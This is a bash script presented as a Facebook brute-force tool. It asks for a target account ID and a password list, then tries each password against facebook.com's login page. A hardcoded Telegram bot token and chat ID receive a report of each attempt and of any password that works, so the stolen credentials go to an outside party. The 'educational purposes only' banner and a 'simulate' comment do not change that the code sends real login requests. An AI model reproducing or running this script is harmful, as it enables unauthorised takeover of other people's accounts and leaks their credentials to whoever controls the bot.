#!/bin/bash
# tool.sh - Error-Free Brute-Force Tool

#-------------------
#   Color Settings
#-------------------
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

#-------------------
#   ASCII Art
#-------------------
display_logo() {
    clear
    echo -e "${RED}"
    echo '
██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗
██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║
███████║█████╗  ██╔████╔██║███████║   ███████║██║
██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║
██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝
    '
    echo -e "${RESET}"
    echo -e "${GREEN}[+] Tool by YourName${RESET}"
    echo -e "${YELLOW}[!] For educational purposes only${RESET}\n"
}

#-------------------
#   Configuration
#-------------------
BOT_TOKEN="7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"
CHAT_ID="5967116314"

#-------------------
#   Telegram API
#-------------------
send_telegram() {
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$1" >/dev/null
}

#-------------------
#   Brute-Force Module
#-------------------
brute_force() {
    read -p "Enter Facebook ID: " FB_ID
    read -p "Enter Password List Path: " PASS_LIST

    if [ ! -f "$PASS_LIST" ]; then
        echo -e "${RED}[!] Password list not found!${RESET}"
        exit 1
    fi

    echo -e "${BLUE}[*] Starting brute-force attack...${RESET}"
    send_telegram "Starting attack on: $FB_ID"

    while IFS= read -r pass; do
        # Simulate login attempt (replace with actual HTTP request in real scenarios)
        response=$(curl -s -c cookies.txt -d "email=$FB_ID&pass=$pass" "https://www.facebook.com/login.php")
        
        if echo "$response" | grep -q "Welcome"; then
            msg="${GREEN}[+] SUCCESS! Password found: $pass${RESET}"
            echo "$msg"
            send_telegram "SUCCESS! Password: $pass"
            break
        else
            msg="${RED}[-] Failed: $pass${RESET}"
            echo "$msg"
            send_telegram "Failed: $pass"
        fi
    done < "$PASS_LIST"
}

#-------------------
#   Main Execution
#-------------------
display_logo
brute_force
